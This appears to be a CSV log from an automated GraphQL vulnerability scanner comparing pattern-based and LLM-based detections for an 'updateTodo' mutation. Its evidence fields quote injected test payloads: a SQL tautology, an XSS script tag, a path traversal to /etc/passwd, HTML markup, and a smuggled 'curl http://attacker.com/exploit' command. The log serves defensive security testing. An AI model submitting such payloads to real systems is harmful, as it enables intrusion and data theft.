timestamp,node_name,response_status,simple_count,llm_count,agreement_score,consensus,common_categories,simple_unique,llm_unique,simple_vulnerable_count,simple_potential_count,simple_safe_count,llm_vulnerable_count,llm_potential_count,llm_safe_count,potential_agreement_score,potential_consensus,common_potential_categories,simple_unique_potential,llm_unique_potential,simple_results,llm_results
2025-10-05T15:40:03.783944,updateTodo_response_2,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""SQL Injection (SQLi) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""SQL injection vulnerability detected - malicious SQL patterns found in response"", ""evidence"": ""Response status: 200, SQL patterns detected in response""}]","[{""detection_name"": ""LLM: sql_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The payload 'Test' OR 1=1;-- in the title field is a classic SQL injection pattern. This could indicate unsanitized input being injected into a SQL query (e.g., bypassing WHERE clauses). While the response doesn't show direct SQL errors or data leaks, the presence of an SQL tautology and comment sequence in a mutation input strongly suggests improper input handling vulnerable to SQLi if raw SQL concatenation is used."", ""evidence"": ""Title value contains 'Test' OR 1=1;--' (SQL tautology and comment sequence)"", ""confidence"": 0.7, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""sql_injection"", ""severity"": ""HIGH"", ""confidence"": 0.7, ""evidence"": ""Title value contains 'Test' OR 1=1;--' (SQL tautology and comment sequence)"", ""explanation"": ""The payload 'Test' OR 1=1;-- in the title field is a classic SQL injection pattern. This could indicate unsanitized input being injected into a SQL query (e.g., bypassing WHERE clauses). While the response doesn't show direct SQL errors or data leaks, the presence of an SQL tautology and comment sequence in a mutation input strongly suggests improper input handling vulnerable to SQLi if raw SQL concatenation is used.""}}]"
2025-10-05T15:40:11.630570,updateTodo_response_3,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Cross-Site Scripting (XSS) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""XSS injection vulnerability detected - malicious script patterns found in response"", ""evidence"": ""Response status: 200, XSS patterns detected in response data""}]","[{""detection_name"": ""LLM: xss_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response returns unsanitized user-controlled input (`<script>alert(1)</script>`) in the `title` field. This indicates the application does not properly escape HTML characters before rendering them in client-side contexts. If this value is rendered directly in a browser (e.g., via innerHTML or similar unsafe methods), it would trigger XSS. While GraphQL itself does not render content, the presence of raw HTML/script payloads in the API response strongly suggests insufficient input sanitization and a client-side XSS risk."", ""evidence"": ""\""title\"": \""<script>alert(1)</script>\"""", ""confidence"": 0.9, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""xss_injection"", ""severity"": ""HIGH"", ""confidence"": 0.9, ""evidence"": ""\""title\"": \""<script>alert(1)</script>\"""", ""explanation"": ""The response returns unsanitized user-controlled input (`<script>alert(1)</script>`) in the `title` field. This indicates the application does not properly escape HTML characters before rendering them in client-side contexts. If this value is rendered directly in a browser (e.g., via innerHTML or similar unsafe methods), it would trigger XSS. While GraphQL itself does not render content, the presence of raw HTML/script payloads in the API response strongly suggests insufficient input sanitization and a client-side XSS risk.""}}]"
2025-10-05T15:40:17.738205,updateTodo_response_4,400,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-05T15:40:46.058444,updateTodo_response_5,200,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,1,0,0,0.0,no_potential,,,,[],"[{""detection_name"": ""LLM: os_command_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The payload contains a semicolon (;) followed by a curl command to an external domain, which is a common pattern for testing command injection. Semicolons allow command chaining in Unix-like systems, and the curl command suggests an attempt to trigger external network calls from the server. In GraphQL mutations like 'updateTodo', unsanitized user input passed to system commands could enable OS command execution."", ""evidence"": ""title: 'test; curl http://attacker.com/exploit'"", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""os_command_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.95, ""evidence"": ""title: 'test; curl http://attacker.com/exploit'"", ""explanation"": ""The payload contains a semicolon (;) followed by a curl command to an external domain, which is a common pattern for testing command injection. Semicolons allow command chaining in Unix-like systems, and the curl command suggests an attempt to trigger external network calls from the server. In GraphQL mutations like 'updateTodo', unsanitized user input passed to system commands could enable OS command execution.""}}]"
2025-10-05T15:40:53.826000,updateTodo_response_6,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Path Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""Path injection vulnerability detected - file system access patterns found"", ""evidence"": ""Response status: 200, Path injection patterns detected in response""}]","[{""detection_name"": ""LLM: Path Injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The GraphQL mutation response contains a payload with \""../../../../etc/passwd\"" in the title field, indicating potential path traversal. This suggests the server accepted unsanitized user input that could be used to manipulate file system paths. While direct proof of file access isn't shown, the presence of directory traversal sequences in a mutation response strongly implies insufficient path validation/sanitization, a prerequisite for path injection vulnerabilities."", ""evidence"": ""title: \""../../../../etc/passwd\"" in mutation response"", ""confidence"": 0.8, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""Path Injection"", ""severity"": ""HIGH"", ""confidence"": 0.8, ""evidence"": ""title: \""../../../../etc/passwd\"" in mutation response"", ""explanation"": ""The GraphQL mutation response contains a payload with \""../../../../etc/passwd\"" in the title field, indicating potential path traversal. This suggests the server accepted unsanitized user input that could be used to manipulate file system paths. While direct proof of file access isn't shown, the presence of directory traversal sequences in a mutation response strongly implies insufficient path validation/sanitization, a prerequisite for path injection vulnerabilities.""}}]"
2025-10-05T15:41:01.276953,updateTodo_response_7,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,0,1,0,1.0,both_potential,Injection Attacks,,,"[{""detection_name"": ""HTML Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""HTML injection vulnerability detected - HTML markup found in response"", ""evidence"": ""Response status: 200, HTML patterns detected in response data""}]","[{""detection_name"": ""LLM: html_injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""The response includes unescaped HTML markup (<h1> tag) in the 'title' field. If this value is rendered directly in a client's HTML DOM without sanitization, it could enable HTML injection. While not full XSS (no script execution demonstrated), this shows improper handling of user-controlled markup."", ""evidence"": ""title field contains '<h1>Unauthorized Access</h1>'"", ""confidence"": 0.8, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""html_injection"", ""severity"": ""MEDIUM"", ""confidence"": 0.8, ""evidence"": ""title field contains '<h1>Unauthorized Access</h1>'"", ""explanation"": ""The response includes unescaped HTML markup (<h1> tag) in the 'title' field. If this value is rendered directly in a client's HTML DOM without sanitization, it could enable HTML injection. While not full XSS (no script execution demonstrated), this shows improper handling of user-controlled markup.""}}]"
2025-10-05T15:41:39.034905,updateTodo_response_8,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-05T15:42:23.843990,updateTodo_response_9,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-05T15:43:00.708909,updateTodo_response_10,400,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-05T15:43:19.366500,updateTodo_response_11,200,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
